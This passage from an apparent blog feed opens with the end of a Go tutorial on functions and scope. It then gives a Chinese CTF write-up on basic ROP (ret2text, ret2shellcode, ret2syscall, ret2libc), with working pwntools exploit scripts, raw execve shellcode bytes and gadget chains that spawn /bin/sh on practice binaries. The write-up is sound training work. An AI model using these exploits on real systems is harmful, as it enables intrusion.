href="#Go函数" class="headerlink" title="Go函数"></a>Go函数</h2><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><p>go的函数定义格式如下：</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">func_name</span> <span class="hljs-params">([parameter list])</span> [<span class="hljs-title">return</span> <span class="hljs-title">types</span>]</span>&#123;<br>函数体<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>func：函数由func开始声明</li><li>func_name：函数名称，参数列表和返回值类型构成了函数签名</li><li>parameter list：参数列表，参数就像一个占位符，当函数被调用的时候，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的。</li><li>return types：返回类型，函数返回一列值。return types是该列值得数据类型。有些功能不需要返回值，这种情况下，不是必须的。</li></ul><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(num1, num2 <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<br><span class="hljs-keyword">return</span> num1 + num2<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> ret <span class="hljs-keyword">int</span><br>ret = add(<span class="hljs-number">15</span>, <span class="hljs-number">30</span>)<br>fmt.Print(ret)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/14.png"></p><h2 id="Go变量作用域"><a href="#Go变量作用域" class="headerlink" title="Go变量作用域"></a>Go变量作用域</h2><p>作用域为已声明标识符所表示的常量、类型、变量、函数或包在源代码中的作用范围。</p><p>Go中的变量可以在三个地方声明：</p><ul><li>函数内定义的变量称为局部变量</li><li>函数外定义的变量称为全局变量</li><li>函数定义的变量称为形式参数</li></ul><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//全局变量</span><br><span class="hljs-keyword">var</span> c <span class="hljs-keyword">int</span> = <span class="hljs-number">1</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//局部变量</span><br><span class="hljs-keyword">var</span> a, b <span class="hljs-keyword">int</span><br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-number">2</span><br>fmt.Println(a, b, c)<br>d := add(a, b)<br>fmt.Println(d)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<br><span class="hljs-keyword">return</span> a + b<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Go语言运算符&quot;&gt;&lt;a href=&quot;#Go语言运算符&quot; class=&quot;headerlink&quot; title=&quot;Go语言运算符&quot;&gt;&lt;/a&gt;Go语言运算符&lt;/h2&gt;&lt;p&gt;运算符用于在程序运行时执行数学或者逻辑运算&lt;/p&gt;
&lt;p&gt;Go语言内置的运算符有：&lt;/p&gt;
&lt;ul&gt;</summary>
      
    
    
    
    <category term="Go语言学习" scheme="https://b1ackie.cn/categories/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Go语言" scheme="https://b1ackie.cn/tags/Go%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP</title>
    <link href="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/"/>
    <id>https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/</id>
    <published>2021-11-26T05:47:47.000Z</published>
    <updated>2021-12-10T08:42:58.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>还是继续学习练习ROP技术，现在是跟着CTF WIKI中的ROP来学习一下。</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本ROP</a></p><h2 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h2><p>随着NX的保护开启，曾经直接向栈或者堆上直接注入代码的方式难以继续发挥作用。攻击者也提出了相应的方法来绕过保护，目前主要的是ROP，其主要的思想就是在栈缓冲区溢出的基础上，利用程序中已经有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓的gadget就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>叫做ROP的原因是，利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般满足以下条件：</p><ul><li>程序存在溢出，并且可以控制返回地址</li><li>可以知道满足条件的gadgets以及相应的gadgets地址</li></ul><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>ret2text即控制程序执行程序本身已有的代码（.text）。这种攻击方法是一种笼统的描述，我们控制执行程序已有的代码也可以控制程序执行好几段不相邻的程序已有的代码（也就是gadgets），就是所谓的ROP。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>用ret2text做例子</p><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p>查看一下保护机制，看到只开启了NX。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/1.png"></p><p>使用IDA查看，看到有一个gets函数，存在一个栈溢出漏洞</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/2.png"></p><p>还看到了有<code>system(/bin/sh)</code>，只要覆盖返回地址到这里就可以了。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/3.png"></p><p>现在来尝试构造一下payload，使用GDB打开调试看一下栈的情况，输入112个a和4个b，看到此时的栈空间</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/4.png"></p><p>查看执行到ret的时候，返回的地址是bbbb，证明构造的payload是对的，将bbbb换成要返回的地址0x804863A即可。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/5.png"></p><p>编写EXP</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br><span class="hljs-attribute">payload</span> = <span class="hljs-number">0</span>x<span class="hljs-number">804863</span>A<br><span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">112</span> + p<span class="hljs-number">32</span>(payload))<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/6.png"></p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>ret2shellcode就是控制程序流程执行shellcode代码。在栈溢出的基础上，执行shellcode，需要对应的区域具有可执行的权限。</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><p>例子在这里下载<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>首先查看一下程序的保护机制，几乎没有开启任何的保护，且有可读可写可执行的段。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/7.png"></p><p>使用IDA查看，可以看到存在栈溢出，输入的内容会被复制到<code>buf2</code>之中。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/8.png"></p><p>查看<code>buf2</code>可以看到是在bss段。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/9.png"></p><p>使用gdb打开调试，上面看到<code>buf2</code>在0x804A080，从这里看到有可执行权限。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/10.png"></p><p>调试确定payload的长度，输入112个a和4个b，可以看到返回地址是bbbb，现在就可以确定长度了。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/11.png"></p><p>生成一段shellcode，填充到112位，然后把返回地址覆盖到<code>buf2</code>的起始地址，在段上执行shellcode就可以了。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;./ret2shellcode&quot;</span>)<br><span class="hljs-attribute">shellcode</span> = asm(shellcraft.sh())<br><span class="hljs-attribute">buf2_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">080</span><br><span class="hljs-attribute">p</span>.sendline(shellcode.ljust(<span class="hljs-number">112</span>,<span class="hljs-string">&quot;p&quot;</span>) + p<span class="hljs-number">32</span>(buf<span class="hljs-number">2</span>_addr))<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/12.png"></p><h4 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2shellcode/sniperoj-pwn100-shellcode-x86-64/shellcode">sniperoj-pwn100-shellcode-x86-64</a></p><p>查看保护机制，只开启了PIE，也就是基址随机化。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/13.png"></p><p>分析一下程序，看到<code>read</code>函数会将数据读到<code>buf</code>中，存在一个栈溢出，段可执行，应该要自己构造shellcode来获取shell。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/14.png"></p><p>现在来尝试构造一下payload，<code>buf</code>长度0x10，构造24个a加上8个b，用来覆盖返回地址。看到返回地址被成功覆盖</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/16.png"></p><p>但是这次不可以用刚才pwntools中生成的那个shellcode了，因为<code>read</code>函数只能读取64个字节的数据，从图中可以看到这个shellcode是44个字节</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/17.png"></p><p>需要找新的shellcode，在这里可以寻找对应的shellcode，也可以自己尝试去写</p><p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a></p><p>我找到了这个shellcode，22字节</p><p><a href="https://www.exploit-db.com/shellcodes/47008">https://www.exploit-db.com/shellcodes/47008</a></p><p>这次exp的编写，shellcode不可以放在返回地址之前了，因为这样栈空间是不足的，在shellcode里有好几个push的操作，且它并没有开辟栈空间，比如<code>sub esp,0x100</code>，我们知道栈是从栈顶开始入栈的，此时我们的代码是放在栈顶之上的，如果不断的push 压栈，那么我们的栈里的代码就会被破坏</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/18.png"></p><p>就像这个图一样，不断的压栈会破坏代码</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/19.png"></p><p>原始代码</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/20.png"></p><p>被破坏的代码和栈的情况，这部分具体在之前的文章有讲过<a href="https://b1ackie.cn/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/">栈溢出原理与实践</a></p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/21.png"></p><p>现在尝试编写exp，把shellcode放在后面，放在后面的不管怎么压栈都不会破坏代码。</p><p>因为是动态基址，所以关键在于buf的地址获取，但是题目中给了我们buf的地址，所以不用担心。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/22.png"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./sniperoj-pwn100-shellcode-x86-64&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>buf_addr = p.recvuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br>shellcode = <span class="hljs-string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;</span><br>buf_addr = <span class="hljs-built_in">int</span>(buf_addr , <span class="hljs-number">16</span>)<br>buf_addr += <span class="hljs-number">32</span><br><span class="hljs-comment">#print(hex(buf_addr))</span><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span> + p64(buf_addr) + shellcode<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/23.png"></p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>ret2syscall，就是控制程序执行系统调用的，获取shell</p><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><p>查看保护机制，开启了NX。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/24.png"></p><p>使用IDA打开，可以看到<code>gets</code>函数存在栈溢出，</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/25.png"></p><p>查看字符串，存在<code>/bin/sh</code>，但是找不到<code>system</code>函数，需要自己构造</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/26.png"></p><p>可以通过gadgets来获得shell。我们需要把获取对应shell的系统调用放到对应的寄存器中，这样在执行<code>int 0x80</code>可以执行对应的系统调用</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-string">&quot;/bin/sh&quot;</span>,null.null)</span></span><br></code></pre></div></td></tr></table></figure><p>对于这个32位的程序，需要构造如下的寄存器</p><ul><li>系统调用号，eax=0xb</li><li>第一个参数，ebx应该指向<code>/bin/sh</code>的地址，或者是执行sh的地址</li><li>第二个参数，ecx=0</li><li>第三个参数，edx=0</li></ul><p>控制寄存器的值，就需要用到gadgets，此时栈顶是10，执行一个pop eax之后，eax就等于10。但是在程序中不一定有连续的可以控制这些寄存器的值，需要一段一段的控制。寻找gadgets的方法，可以使用ropgadgets工具。</p><p>查找pop eax和ret的地址，找到一个pop eax，在retn的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/27.png"></p><p>看到这个地址</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-number">0x080bb196</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; ret</span><br></code></pre></div></td></tr></table></figure><p>再找pop ebx和ret的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/28.png"></p><p>看到这样一个地址，剩下三个寄存器都可以用到。</p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss"><span class="hljs-number">0x0806eb90</span> : <span class="hljs-keyword">pop</span> edx ; <span class="hljs-keyword">pop</span> ecx ; <span class="hljs-keyword">pop</span> ebx ; ret<br></code></pre></div></td></tr></table></figure><p>现在就可以来控制程序的流程，首先覆盖返回地址到上述两个地址任意一个，比如pop eax/ret地址这，然后再覆盖下面的为0xb，这样ret就会到pop eax/ret这里，然后pop eax，eax就是0xb，之后是一样的流程。</p><p>现在来确定一下payload长度，使用GDB调试，输入112个a，再输入4个b，</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/29.png"></p><p>编写EXP</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br>pop_eax_ret = <span class="hljs-number">0x80bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x806eb90</span><br>int_80_addr = <span class="hljs-number">0x8049421</span><br>binsh_addr = <span class="hljs-number">0x80be408</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(pop_eax_ret)+p32(<span class="hljs-number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="hljs-number">0</span>) +p32(<span class="hljs-number">0</span>) + p32(binsh_addr)+ p32(int_80_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/30.png"></p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>ret2libc就是控制函数的执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，会选择执行<code>system(&quot;/bin/sh&quot;)</code>，所以需要知道<code>system</code>函数的地址。</p><h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p><p>查看一下保护机制，看到只开启了NX。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/31.png"></p><p>使用IDA查看，看到存在一个<code>gets</code>函数，存在栈溢出</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/32.png"></p><p>在IDA里能看到<code>system</code>函数，还有<code>/bin/sh</code>的地址，那么就可以获取shell。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/33.png"></p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/34.png"></p><p>确定payload，这次用cyclic这个工具来获取一下需要覆盖到返回地址的长度，</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/35.png"></p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/36.png"></p><p>编写EXP</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>bin_addr = <span class="hljs-number">0x8048720</span><br>system_addr = <span class="hljs-number">0x8048460</span><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">112</span> + p32(system_addr) + <span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">4</span> + p32(bin_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/37.png"></p><h4 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p><p>查看保护机制，只开启了NX保护</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/39.png"></p><p>用IDA查看，可以看到有一个<code>gets</code>函数，存在栈溢出，跟上一道题一样到流程</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/38.png"></p><p>只是这道题只有<code>system</code>的地址，但是没有<code>/bin/sh</code>，所以要自己构造。</p><p>在bss段还可以找到<code>buf2</code>，可以把<code>/bin/sh</code>写到<code>buf2</code>中。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/40.png"></p><p>查看bss段属性可写可读</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/41.png"></p><p>然后再找到<code>gets</code>函数地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/42.png"></p><p>偏移量跟上一个是一样的，就不再计算了，现在尝试构造payload。</p><p>现在有两种构造的方法，第一个就是，覆盖返回地址为<code>gets</code>函数地址，然后是返回地址，返回地址是一个<code>pop/ret</code>的地址，然后是<code>buf2</code>的地址，此时<code>gets</code>会把输入存在<code>buf2</code>内，然后是<code>system</code>函数地址，任意一个返回地址，<code>buf2</code>地址。这样的执行流程，首先是返回到<code>gets</code>，输入<code>/bin/sh</code>保存到<code>buf2</code>，然后返回到<code>pop/ret</code>的地方， pop一次，将<code>buf2</code>地址弹出去，此时栈顶是<code>system</code>函数地址，再次ret就会执行<code>system(&quot;/bin/sh&quot;)</code></p><p>第二个就是不需要<code>pop/ret</code>的地址，直接把<code>system</code>函数地址作为<code>gets</code>函数的返回地址，执行流程是一样的。</p><h5 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h5><p>查找<code>pop/ret</code>的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/43.png"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br><br>pop_ret_addr = <span class="hljs-number">0x804843d</span><br>gets_addr = <span class="hljs-number">0x8048460</span><br>system_addr = <span class="hljs-number">0x8048490</span><br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br><span class="hljs-comment">#第一种方法</span><br><span class="hljs-comment">#payload = &#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ret_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;b&#x27;*4 + p32(buf2_addr)</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(gets_addr) + p32(system_addr) + p32(buf2_addr)+ p32(buf2_addr)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/44.png"></p><h4 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p><p>查看保护只开启了NX。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/45.png"></p><p>看到存在栈溢出，可以尝试ROP。此例子是在例2的基础上，将<code>system</code>函数的地址去掉，此时需要同时找到<code>system</code>函数地址和</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/46.png"></p><p>现在的问题就是如何寻找<code>system</code>函数的地址。</p><p><code>system</code>函数属于<code>libc</code>，而<code>libc.so</code>动态链接库中的函数相对偏移是固定的。即使程序有ASLR，最低的12位也不会改变，而libc在<a href="https://github.com/niklasb/libc-database">github</a>上有人进行收集。</p><p>我们如果知道了libc中某个函数的地址，那么就可以确定该程序利用的libc，进而可以知道system函数的地址。得到libc中函数地址一般是用got表泄露，就是输出某个函数对应的got表项的内容。当然，由于libc的延迟绑定机制，我们需要泄露已经执行过得函数的地址。</p><p>现在来手工先寻找一下这些地址，来加深理解。</p><p>先来寻找一下libc的基址，使用gdb加载libc3，然后打印出<code>__libc_start_main</code>的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/47.png"></p><p>使用<code>ldd</code>命令可以查看程序依赖的libc版本，再将其复制到当前路径下</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/48.png"></p><p>搜索<code>__libc_start_main</code>可以看到其偏移是<code>0x18e30</code>，由此可以算出基址是</p><blockquote><p>0xf7df5e30-0x18e30=0xf7ddd000</p></blockquote><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/49.png"></p><p>有了基址就可以计算出其他的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/50.png"></p><p>现在的思路就是，通过现有的函数打印出<code>__libc_start_main</code>的地址，然后寻找<code>libc</code>中的地址，来计算基址，有了基址，查找到<code>system</code>和<code>/bin/sh</code>的偏移就可以得到。</p><p>现在编写个EXP，通过利用<code>LibcSearcher</code>可以快速的帮助查找。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, 